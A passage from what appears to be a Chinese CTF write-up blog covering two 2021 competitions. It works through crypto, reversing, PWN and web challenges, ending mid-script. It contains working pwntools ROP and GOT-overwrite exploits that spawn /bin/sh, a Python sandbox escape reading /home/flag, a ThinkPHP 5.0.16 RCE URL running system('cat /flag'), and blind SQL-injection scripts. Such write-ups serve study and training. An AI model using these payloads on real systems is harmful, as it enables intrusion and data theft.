os.listdir(folder_name) for f in files: f_path = folder_name + os.sep + f if os.path.isfile(f_path): print(&quot;解压--&quot;+f) uncompress(path_name=f_path) 运行完成发现 flag194.7z 解压成功，得到一张二维码， 扫描得到的内容，经hex+base64+base62+base58+base32 解码得flag：flag&#123;6095B134-5437-4B21-BE52-EDC46A276297&#125;。 ​ ecryptedzip只提供了一个带 README.md 和 LICENSE 两个文件的加密zip压缩包，用ARCHPR弱密码及字典都无法得到密码。 想到这两个文件经常默认出现在Github库中，随便找一个Github库，下载LICENSE文件，发现大小与压缩包内的LICENSE文件相近，可以采用已知部分明文（至少连续12字节）攻击方式破解。保留下载的LICENSE文件中前几行内容，用rbkcrack工具跑key： rbkcrack.exe -C ecryptedzip.zip -c LICENSE -p LICENSE.txt 拿到三组key之后进行解密： rbkcrack.exe -C ecryptedzip.zip -c README.md -k 32cc3495 7f955ff5 58291af3 -d README.md 或直接将key输入ARCHPR的明文攻击模式里的key输入框中，成功解压zip包。 flag：flag&#123;Kn0wn_pla1ntext_attack_Is_very_Usefully&#125;。 ​ CRYPTO[签到]键盘侠 UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN flag{} 提交时括号内为大写字母 键盘密码，按字母顺序在键位比划：flag&#123;CLCKOUTHK&#125;。 ​ [萌新]素数 目前768位的素数选择下，rsa等公钥加密算法已经不安全，rsa加密需要进行更大素数的选择，请您选出10个1024位以上的大素数提交给我 http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn/ 备用 http://sushu_5rg35rg4g.nssctf.neusoft.edu.cn/ 页面输入10个1024位以上的素数提交拿flag。生成1025位的素数： 1234from Crypto.Util.number import *for i in range(10): print(getPrime(1025)) flag：flag&#123;d6a6a1bc-88e9-4330-83f9-bdd3bdad5401&#125;。 ​ silent_peeper You are just a silent peeper, silently discovering the secret. 12345678910111213141516171819202122232425262728from Crypto.Util.number import *from Crypto.Cipher import AESimport binasciiflag = &quot;flag&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;&quot;bs = AES.block_sizepad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)p = 174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977a = getRandomNBitInteger(40)b = getRandomNBitInteger(40)A = pow(g, a, p)B = pow(g, b, p)assert pow(A, b, p) == pow(B, a, p)key = pow(A, b ,p)key = long_to_bytes(key)[:16]cipher = AES.new(key, AES.MODE_ECB)ciphertext = cipher.encrypt(pad(flag))with open(&#x27;cipher&#x27;, &#x27;w&#x27;) as f: f.write(&quot;A, B = &#123;&#125;\\n&quot;.format(str((A, B)))) f.write(&quot;ciphertext = &#123;&#125;\\n&quot;.format(binascii.hexlify(ciphertext))) f.close()# cipher# A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016L, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544L)# ciphertext = ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c Diffie-Hellman密钥交换，已知生成元 $g$、模数 $p$ 和AB根据40位随机数 $a,b$ 生成的各自的数 $A=g^a \\pmod p,B=g^b \\pmod p$，求共享密钥 $K=g^{ab} \\pmod p$。 $a,b$ 都为40位比较小，可以采用lambda算法解离散对数，解出 $a$ 或 $b$ 即可计算 $K$： 12345678910111213141516# Sagep = 174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544)k = GF(p)B = k(B)g = k(g)b = discrete_log_lambda(B,g,(1,2**40))ciphertext = &#x27;ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c&#x27;key = pow(A, b ,p)key = long_to_bytes(key)[:16]cipher = AES.new(key, AES.MODE_ECB)m = cipher.decrypt(bytes.fromhex(ciphertext))print(m)# b&#x27;flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;\\x06\\x06\\x06\\x06\\x06\\x06&#x27; flag：flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;。 ​ WEB[签到] flag http://47.106.172.144:65333/ 页面不断随机输出flag各位置对应字符，复制，脚本填充： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748flag=[&#x27;?&#x27;]*20flag[11]=&#x27;f&#x27;flag[16]=&#x27;a&#x27;flag[19]=&#x27;9&#x27;flag[10]=&#x27;N&#x27;flag[5]=&#x27;3&#x27;flag[15]=&#x27;n&#x27;flag[16]=&#x27;a&#x27;flag[4]=&#x27;Z&#x27;flag[8]=&#x27;c&#x27;flag[4]=&#x27;Z&#x27;flag[17]=&#x27;W&#x27;flag[11]=&#x27;f&#x27;flag[2]=&#x27;x&#x27;flag[7]=&#x27;u&#x27;flag[9]=&#x27;3&#x27;flag[8]=&#x27;c&#x27;flag[17]=&#x27;W&#x27;flag[11]=&#x27;f&#x27;flag[9]=&#x27;3&#x27;flag[13]=&#x27;G&#x27;flag[11]=&#x27;f&#x27;flag[0]=&#x27;Z&#x27;flag[0]=&#x27;Z&#x27;flag[10]=&#x27;N&#x27;flag[12]=&#x27;b&#x27;flag[1]=&#x27;m&#x27;flag[0]=&#x27;Z&#x27;flag[14]=&#x27;9&#x27;flag[1]=&#x27;m&#x27;flag[0]=&#x27;Z&#x27;flag[16]=&#x27;a&#x27;flag[14]=&#x27;9&#x27;flag[16]=&#x27;a&#x27;flag[13]=&#x27;G&#x27;flag[3]=&#x27;h&#x27;flag[12]=&#x27;b&#x27;flag[11]=&#x27;f&#x27;flag[12]=&#x27;b&#x27;flag[15]=&#x27;n&#x27;flag[3]=&#x27;h&#x27;flag[9]=&#x27;3&#x27;flag[17]=&#x27;W&#x27;flag[5]=&#x27;3&#x27;flag[6]=&#x27;t&#x27;flag[18]=&#x27;5&#x27;print(&#x27;&#x27;.join(flag))# ZmxhZ3tuc3NfbG9naW59 base64解码得flag：flag&#123;nss_login&#125;。 ​ REVERSE[签到]signin 逆向 真 签到题 010editor 16进制查看，搜索出flag：flag&#123;REVERSE_1s_Very_3asy!&#125;。 ​ [萌新]happyCTFIDA反编译，发现去了符号，分析代码逻辑，需输入长度24的flag字符串，经 sub_403B70() 函数里逐字符异或0x14后，与字符串 rxusoCqxw&#123;yqK`&#123;KZqag&#123;r`i 比较，相等则通过。 按异或性质，将字符串与0x14逐字符异或还原flag：flag&#123;Welcome_to_Neusoft&#125;。 ​ Remember Crypt 4从题目就能猜出是RC4，main() 函数代码： 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax unsigned int v4; // eax void *v5; // rax void *v7; // rax int i; // [rsp+24h] [rbp-D4h] void *v9; // [rsp+28h] [rbp-D0h] char v10[32]; // [rsp+30h] [rbp-C8h] BYREF char Str[128]; // [rsp+50h] [rbp-A8h] BYREF strcpy(Str, &quot;12345678abcdefghijklmnopqrspxyz&quot;); memset(&amp;Str[32], 0, 0x60ui64); memset(v10, 0, 0x17ui64); sub_1400054D0(&quot;%s&quot;, v10); v9 = malloc(0x408ui64); v3 = strlen(Str); sub_140001120(v9, Str, v3); v4 = strlen(v10); sub_140001240(v9, v10, v4); for ( i = 0; i &lt; 22; ++i ) &#123; if ( ((unsigned __int8)v10[i] ^ 0x22) != byte_14013B000[i] ) &#123; v5 = (void *)sub_1400015A0(&amp;off_14013B020, &quot;error&quot;); _CallMemberFunction0(v5, sub_140001F10); return 0; &#125; &#125; v7 = (void *)sub_1400015A0(&amp;off_14013B020, &quot;nice job&quot;); _CallMemberFunction0(v7, sub_140001F10); return 0;&#125; 整体逻辑为，输入字符串经过 sub_140001120() 和 sub_140001240() 函数处理后，与0x22异或，与 byte_14013B000 数组比较。看两函数特征，分别为RC4算法的KSA和PRGA函数，key为 12345678abcdefghijklmnopqrspxyz。 IDA提取数组hex值：9EE7305FA701A653591B0A20F173D10EAB09840E8D2B0000，Cyberchef FromHex+XOR+RC4一把梭，得到flag：flag&#123;nice_to_meet_you&#125;。 ​ PWN[签到]NssShop nc 47.106.172.144 65002 真 签到题 不会PWN的同学也可以来试试 nc连接，当前金额为0，选择 1.Buy Item， 看到flag价格10000，hint价格0，选择 1.Hint:0$， 回显 Unlimited purchase of items in the shop，说明数量无上限。 利用int型溢出性质，使得flag单价与数量乘积的总价上溢为负数即可。 选择 0.Flag:10000$，输入数量111111111，得到flag：flag&#123;Pwn_Is_Vary_Ez&#125;。 justdoit nc 47.106.172.144 65004 IDA分析，main() 函数代码： 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); printf(&quot;Hi there! What is your name? &quot;); read(0, buf, 0x18uLL); puts(&quot;That is an interesting chall&quot;); printf(&quot;where are you from? my frends??&quot;); read_long(); return 0;&#125; read_long() 函数： 1234567__int64 read_long()&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF read(0, buf, 0x13uLL); return atol(buf);&#125; 从代码看不出有什么利用之处，切换回汇编视图，发现 read_long() 函数在返回rax值时，rbp存在一个加操作： 123456789101112131415161718192021222324252627282930313233343536.text:00000000004011D5 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00000000004011D5 public main.text:00000000004011D5 main proc near ; DATA XREF: _start+21↑o.text:00000000004011D5.text:00000000004011D5 buf = byte ptr -20h.text:00000000004011D5.text:00000000004011D5 ; __unwind &#123;.text:00000000004011D5 push rbp.text:00000000004011D6 mov rbp, rsp.text:00000000004011D9 sub rsp, 20h.text:00000000004011DD mov eax, 0.text:00000000004011E2 call init.text:00000000004011E7 lea rax, format ; &quot;Hi there! What is your name? &quot;.text:00000000004011EE mov rdi, rax ; format.text:00000000004011F1 mov eax, 0.text:00000000004011F6 call _printf.text:00000000004011FB lea rax, [rbp+buf].text:00000000004011FF mov edx, 18h ; nbytes.text:0000000000401204 mov rsi, rax ; buf.text:0000000000401207 mov edi, 0 ; fd.text:000000000040120C call _read.text:0000000000401211 lea rax, s ; &quot;That is an interesting chall&quot;.text:0000000000401218 mov rdi, rax ; s.text:000000000040121B call _puts.text:0000000000401220 lea rax, aWhereAreYouFro ; &quot;where are you from? my frends??&quot;.text:0000000000401227 mov rdi, rax ; format.text:000000000040122A mov eax, 0.text:000000000040122F call _printf.text:0000000000401234 mov eax, 0.text:0000000000401239 call read_long.text:000000000040123E add rbp, rax ; 加操作.text:0000000000401241 mov eax, 0.text:0000000000401246 leave.text:0000000000401247 retn.text:0000000000401247 ; &#125; // starts at 4011D5.text:0000000000401247 main endp 接着的 leave 是 mov rsp,rbp; pop rbp，rsp将变为rbp+rax，控制rax为-0x20-8，结合 leave 操作可以将rsp移动到 buf 处以写入ROP链。 12345678910111213141516171819202122232425262728293031323334353637from pwn import *binary = context.binary = ELF(&#x27;./justdoit.1&#x27;)p = remote(&#x27;47.106.172.144&#x27;, 65004)libc = ELF(&#x27;./libc-2.23.so&#x27;)pop_rdi = binary.search(asm(&#x27;pop rdi; ret;&#x27;)).__next__()pop2 = binary.search(asm(&#x27;pop r14; pop r15; ret;&#x27;)).__next__()payload = b&#x27;&#x27;payload += p64(binary.sym.main)payload += p64(binary.plt.puts)payload += p64(binary.sym.main)p.sendafter(b&#x27;name? &#x27;, payload)p.sendafter(b&#x27;frends??&#x27;, b&#x27;-40&#x27;)payload = b&#x27;&#x27;payload += p64(pop_rdi)payload += p64(binary.got.puts)payload += p64(pop2)p.sendafter(b&#x27;name? &#x27;, payload)p.sendafter(b&#x27;frends??&#x27;, b&#x27;-40&#x27;)libc.address = u64(p.recv(6) + b&#x27;\\0\\0&#x27;) - libc.sym.putslog.info(&#x27;libc.address: &#x27; + hex(libc.address))payload = b&#x27;&#x27;payload += p64(pop_rdi)payload += p64(libc.search(b&#x27;/bin/sh&#x27;).__next__())payload += p64(libc.sym.system)p.sendafter(b&#x27;name? &#x27;, payload)p.sendafter(b&#x27;frends??&#x27;, b&#x27;-40&#x27;)p.interactive() flag：ctf&#123;01241e36-ea17-4bed-b620-f64f10e5c192&#125;。 ​ reallNeedGoodLuck nc 47.106.172.144 65003 IDA分析，main() 函数代码： 123456789101112131415161718int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; _DWORD *v3; // [rsp+0h] [rbp-30h] int buf; // [rsp+Ch] [rbp-24h] BYREF char nptr[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); init(argc, argv, envp); puts(&quot;need&quot;); puts(&quot;good&quot;); read(0, &amp;buf, 4uLL); puts(&quot;luck! &quot;); read(0, nptr, 9uLL); v3 = (_DWORD *)atoi(nptr); *v3 = buf; exit(0);&#125; buf 和 nptr 都无溢出点，但可以向 buf 写入4字节并覆盖掉写入nptr中值对应地址的内容。 可以任意地址写，考虑将 atoi 改为libc中的 system，再向 system 传入 /bin/sh\\x00 即可getshell，为达成两步利用，还需将 exit 改为 main 地址。 atoi 与system 的偏移只有最后2字节不同，又由于ASLR开启，后1.5字节为0，所以有0.5/8=1/16的几率能将 atoi 改为 system。 12345678910111213141516171819202122232425262728293031323334353637from pwn import *binary = context.binary = ELF(&#x27;./reallNeedGoodLuck.1&#x27;)context.log_level = &#x27;WARN&#x27;attempt = 0while True: try: p = remote(&#x27;47.106.172.144&#x27;, 65003) libc = ELF(&#x27;./libc-2.23.so&#x27;) tout = 1.0 attempt += 1 log.warn(&#x27;attempt: &#x27; + str(attempt)) p.sendafter(b&#x27;good\\n&#x27;,p32(binary.sym.main)) p.sendafter(b&#x27;luck! \\n&#x27;,str(binary.got.exit).encode()) p.sendafter(b&#x27;good\\n&#x27;,p32(((libc.sym.system | 0xf000) &amp; 0xffff) &lt;&lt; 16)) p.sendafter(b&#x27;luck! \\n&#x27;,str(binary.got.atoi - 2).encode()) p.sendafter(b&#x27;good\\n&#x27;,b&#x27;0000&#x27;,timeout=tout) p.sendafter(b&#x27;luck! \\n&#x27;,b&#x27;/bin/sh\\x00&#x27;,timeout=tout) p.sendline(b&#x27;echo test&#x27;) if b&#x27;test&#x27; in p.recvline(timeout=tout): p.interactive() break except AssertionError as err: print(err) sys.exit(1) except: try: p.close() except: continue flag：ctf&#123;8b1bf41f-8b38-4487-86ae-a5df4fa4c85e&#125;。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"NCTF 2021","slug":"match-NCTF-2021","date":"2021-11-28T12:53:29.000Z","updated":"2021-11-28T19:29:51.642Z","comments":true,"path":"2021/11/28/match-NCTF-2021/","permalink":"https://lazzzaro.github.io/2021/11/28/match-NCTF-2021/","excerpt":"","text":"​ 比赛时间：2021.11.27 9:00-2021.11.28 21:00 比赛区分校内校外，比赛结束后结算分别排名，比赛时排行榜不区分 注册队伍登陆后，请在Profile页面绑定队伍成员信息 每支队伍至少绑定一个成员，不超过4人，校内队伍所有成员请填写真实姓名和正确学号，校外队伍至少绑定一个成员，以便颁奖时联系。 未绑定成员信息的队伍可以正常解题但不参与排名 成员信息一经绑定不可更改 禁止对平台进行攻击 禁止与其他队伍交流解题思路 请在比赛结束后12小时内发送详细解题思路（pdf格式）到邮箱nctf@h4ck.fun Rank: 10 MISCSignin find it 签到，https://nctf.h4ck.fun/challenges/NCTF%7BWelcome_to_NCTF_2021!%7D，链接就有flag：NCTF&#123;Welcome_to_NCTF_2021!&#125;。 ​ Hex酱的秘密花园 我们可爱的Hex酱又有了一个强大的功能，可以去执行多行语句惹~但是为了防止有些居心叵测的人，我们专门 把括号，单双引号，都过滤掉，噢对不准色色，所以也不准出现h哟~Ubuntu Python3.6.9快去找Hex酱(QQ:2821876761)私聊吧私聊发送的信息为明文，不需要加base64 1234567891011121314import sysfrom base64 import b64decodecode = sys.argv[1]try: data = b64decode(code.encode()).decode()except: exit(0)for c in &#x27;h&quot;\\&#x27;(&#x27;: if c in data: exit(0)exec(data) 挺有趣的结合了QQBot的python逃逸，由代码知需传入python代码段，不能包含括号、单双引号和字母h，最后exec 函数执行。 断掉了 print() 和 help() 输出方式，可以采用python中的语法糖 @ 类装饰器，在创建类时触发装饰器中的代码逻辑： 12345678910x=95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,104,111,109,101,47,102,108,97,103,39,41,46,114,101,97,100,40,41y=lambda z:x@print@eval@bytes@yclass z: pass#__import__(&#x27;os&#x27;).popen(&#x27;cat /home/flag&#x27;).read() Bot返回flag：NCTF&#123;HexQBot_1s_s0_cut3~&#125;。 ​ 做题做累了来玩玩游戏吧 做了一天的题目，都累了吧，快来玩玩我新写的飞机大战吧，只要通关就能获得flag哟～对了，如果你真的想玩游戏，也许你需要一个mac，Intel和Apple silicon芯片都支持 Unity3D 游戏，主逻辑都在 Assembly-CSarp.dll 中，找到文件： PlaneFire.app/Contents/Resources/Data/Managed/Assembly-CSharp.dll 用ILSpy查看dll程序逻辑，发现最终通过访问 http://h4ck.fun/g4me.txt 获取flag：NCTF&#123;B9F3C1F2-1E65-481C-8AF3-A78FA7A5EB6A&#125;。 ​ 问卷题 问卷链接：https://forms.gle/RcKhJo2uQwQrL4Gu9提示：是Google问卷 签退，答完就有flag：NCTF&#123;Thank_y0u_for_your_participation&#125;。 ​ CRYPTOdsa flag格式nctf{.*}，题目见附件 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.Util.number import *from secret import flagfrom hashlib import sha256import osdef keygen(): while True: p = getPrime(522) q = p//2 if isPrime(q): break g = 3 h = long_to_bytes(getPrime(256)) x = int.from_bytes(h*2, &quot;big&quot;) y = pow(g, x, p) return g, p, q, y, xdef sign(h, x): k = sha256(h.encode().hex().encode()).digest()+sha256(bytes.fromhex(h)+x.to_bytes(128, &quot;big&quot;)).digest() k = int.from_bytes(k, &quot;big&quot;) r = pow(g,k,p) s = (r*x+int(h,16))*inverse(k,q)%q return r, sg, p, q, y, x = keygen()flag = int(flag[5:-1],16)^int(sha256(x.to_bytes(128, &quot;big&quot;)).hexdigest(),16)r, s = sign(hex(flag)[2:], x)print(q)print(y)print(flag)print(r)print(s)&#x27;&#x27;&#x27;40650743302059808774634634244068138501542753026953617483148703464113290519480444509529050631824834777584951166961649968888463087750447378168090155240888982037743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636194805921925438811312671673280199412771068954692916912073818129050333067669919624330046071533920997153227932488842182641815380056666599058512474681029599566250988315160467154466151984370050361176857929057367882169873785845130202154421861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777&#x27;&#x27;&#x27; DSA签名算法，将明文 $m$ 与私钥 $x$ 哈希值 $h(x)$ 的异或值 $H=m \\oplus h(x)$ 传入sign() 函数，并将 $H$ 与 $h(H+x)$ 连接得到的 $k$ 作为临时密钥，计算 $r=g^k \\bmod p$ 和 $s=(rx+H)k^{-1} \\bmod q$，给出签名结果 $(r,s)$，求私钥 $x$。 已知 $g,q,p=2q+1,y,H,r,s$，$x$ 为512位，根据 x = int.from_bytes(h*2, &quot;big&quot;) 可知 $x \\mid (2^{256}+1)$，设 $x=(2^{256}+1)d’$，则 $d’$ 也是256位。 $k$ 由 $H$ 与 $h(H+x)$ 连接得到，$H$ 已知，即 $k$ 的高256位已知，低256位未知，设 $k=2^{256}H+h’$。 根据 $s=(rx+H)k^{-1} \\bmod q$，有： $(2^{256}H+h’)s-(2^{256}+1)d’r-H \\equiv 0 \\pmod q$ 利用coppersmith定理构造格，通过LLL算法计算 $(h’,d’)$，这里采用small_roots脚本攻击： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182# Sageimport itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []q=4065074330205980877463463424406813850154275302695361748314870346411329051948044450952905063182483477758495116696164996888846308775044737816809015524088898203g=3y=7743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636h=19480592192543881131267167328019941277106895469291691207381812905033306766991r=962433004607153392099715322793248884218264181538005666659905851247468102959956625098831516046715446615198437005036117685792905736788216987378584513020215442s=1861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777p=2*q+1from hashlib import sha256import gmpy2kmax=int(sha256(hex(h)[2:].encode().hex().encode()).digest().hex(),16)PR.&lt;h_, d_&gt; = PolynomialRing(Zmod(q))f = (2^256 * kmax + h_) * s - (2^256 + 1) * d_ * r - hroots = small_roots(f, [2^256, 2^256], d=4, m=4)print(roots)for root in roots: kmin = Integer(root[0]) k = (2^256 * kmax + kmin) x_ = Integer(root[1]) x_ = (2^256 + 1) * x_ if pow(g, x_, p) == y: print(&quot;[+] found: &#123;&#125;&quot;.format(x_)) break else: print(&quot;[-] wrong: &#123;&#125;&quot;.format(x_))print(x_)flag = hex(int(sha256(int(x_).to_bytes(128, &quot;big&quot;)).hexdigest(),16) ^^ h)[2:]print(flag)# 1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110 加上外壳，flag：nctf&#123;1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110&#125;。 ​ WEBezsql 这还能注入吗 Hint 1: 另一半flag在数据库中 www.zip 中三个文件 config.php、DB.php、login.php。 login.php 中主逻辑： 12345678910111213141516171819202122&lt;?phpif (isset($_POST[&#x27;password&#x27;]))&#123; $query = db::prepare(&quot;SELECT * FROM `users` where password=md5(%s)&quot;, $_POST[&#x27;password&#x27;]); // (1) if (isset($_POST[&#x27;name&#x27;]))&#123; $query = db::prepare($query . &quot; and name=%s&quot;, $_POST[&#x27;name&#x27;]); // (2) &#125; else&#123; $query = $query . &quot; and name=&#x27;benjaminEngel&#x27;&quot;; &#125; $query = $query . &quot; limit 1&quot;; $result = db::commit($query); if ($result-&gt;num_rows &gt; 0)&#123; die(&#x27;NCTF&#123;ez&#x27;); &#125; else&#123; die(&#x27;Wrong name or password.&#x27;); &#125;&#125;... 使用 db::prepare 预处理sql语句。 跟进 DB.php 看 prepare() 函数的定义： 123456789101112131415161718192021222324252627282930313233343536public static function prepare($query, $args)&#123; if (is_null($query))&#123; return; &#125; if (strpos($query, &#x27;%&#x27;) === false)&#123; die(&#x27;%s not included in query!&#x27;); return; &#125; // get args $args = func_get_args(); array_shift( $args ); $args_is_array = false; if (is_array($args[0]) &amp;&amp; count($args) == 1 ) &#123; // (3) $args = $args[0]; $args_is_array = true; &#125; $count_format = substr_count($query, &#x27;%s&#x27;); if($count_format !== count($args))&#123; // (4) die(&#x27;Wrong number of arguments!&#x27;); return; &#125; // escape foreach ($args as &amp;$value)&#123; $value = static::$db-&gt;real_escape_string($value); // (5) &#125; // prepare $query = str_replace(&quot;%s&quot;, &quot;&#x27;%s&#x27;&quot;, $query); // (6) $query = vsprintf($query, $args); // (7) return $query;&#125; (3)处 prepare() 函数接收的 $args 为数组，(4)处 判断接收参数数量和 %s 数量是否一致，(5)处转义特殊字符，(6)处给 %s 匹配的参数值加单引号，(7)处替换 $query 中对应的 %s 为参数值。 在(1)的password和(2)的name处都使用了格式化字符串 %s，可以在(1)处传入 %s 干扰匹配，并在(2)处传入数组匹配两处 %s： password=%s，name[0]=) or 1=1 --，name[1]=x sql语句由 SELECT * FROM `users` where password=md5(%s) and name=%s limit 1 变为 SELECT * FROM `users` where password=md5() or 1=1 -- ) and name=x limit 1，实现注入。 POST传参读到前半部分flag：NCTF&#123;3v3ryth1ng_。 把 or 1=1 替换为布尔盲注if语句即可拿到后半部分flag： 12345678910111213141516171819202122232425262728293031323334353637import requestsurl = &quot;http://129.211.173.64:3080/login.php&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; payload = f&#x27;if(ascii(substr((select(group_concat(`fl@g`))from(`2021`.NcTF)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; data = &#123; &#x27;password&#x27;: &#x27;%s&#x27;, &#x27;name[0]&#x27;: f&quot;) or &#123;payload&#125; -- &quot;, &#x27;name[1]&#x27;: &#x27;s&#x27; &#125; # r = requests.get(url,params=data) r = requests.post(url,data=data) if &quot;NCTF&#123;3v3ryth1ng_&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) # not_fantast1c_:)&#125; 合并，flag：NCTF&#123;3v3ryth1ng_not_fantast1c_:)&#125; ​ 摆就完事了 啊对对对 太对辣太对辣If you get no idea about the problem,there is no harm in diffing the source code with the official one. 观察url结构 /public/index.php/index/index/index，疑似ThinkPHP路径，随便改写报错知为ThinkPHP V5.0.16。 尝试未开启强制路由RCE漏洞，加后缀： http://129.211.173.64:8085/public/index.php/index/index/index?s=index/\\think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt; 出现phpinfo页，改成 &lt;?php%20system(&quot;cat /flag&quot;);?&gt; 拿到flag：nctf&#123;m1saka_wanna_kaibai&#125;。 ​ 摆就完事了2.0 卷起来 不准摆！ 版本同上，改了逻辑，未开启强制路由RCE漏洞无效。 www.zip 下载源码，发现控制器 applicaion/index/controller/M1sakaM1yuu.php： 123456789101112131415161718192021222324252627282930&lt;?php /* * @Author: m1saka@x1ct34m * @blog: www.m1saka.love */namespace app\\index\\controller;function waf($str)&#123; if(preg_match(&quot;/system| |\\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i&quot;, $str))&#123; return true; &#125;&#125;class M1sakaM1yuu&#123; public function index() &#123; $username = request()-&gt;get(&#x27;username/a&#x27;); $str = implode(&#x27;,&#x27;,$username); if (waf($str)) &#123; return &#x27;&lt;img src=&quot;http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg&quot; alt=&quot;hutao&quot; /&gt;&#x27;; &#125; if($username)&#123; db(&#x27;m1saka&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]); return &#x27;啊对对对&#x27;; &#125; else &#123; return &#x27;说什么我就开摆&#x27;;// &#125; &#125;&#125; 按照ThinkPHP控制器语法，GET方式传入 username 参数值（本地部署，开启debug调试功能测试）： http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username=xxx 正常回显 啊对对对。 后续控制 username 参数值，绕过waf，实现insert注入： http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=if((substr((select(&quot;admin&quot;)),16,1)=&quot;n&quot;),sleep(3),0) 替换为时间盲注： 123456789101112131415161718192021222324252627import requestsurl = &quot;http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=&quot;result = &#x27;&#x27;i = 15while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 payload = 